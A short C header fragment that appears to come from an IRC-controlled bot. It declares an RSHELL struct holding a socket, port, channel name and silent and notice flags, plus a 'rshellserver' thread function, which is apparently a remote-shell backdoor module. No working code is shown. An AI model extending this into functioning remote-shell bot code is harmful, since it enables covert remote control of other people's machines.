#ifdef RSHELL
typedef struct RSHELL
{
	SOCKET sock;
	int threadnum;
	int threads;
	int port;
	char chan[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} RSHELL;

DWORD WINAPI rshellserver(LPVOID pParam);
#endif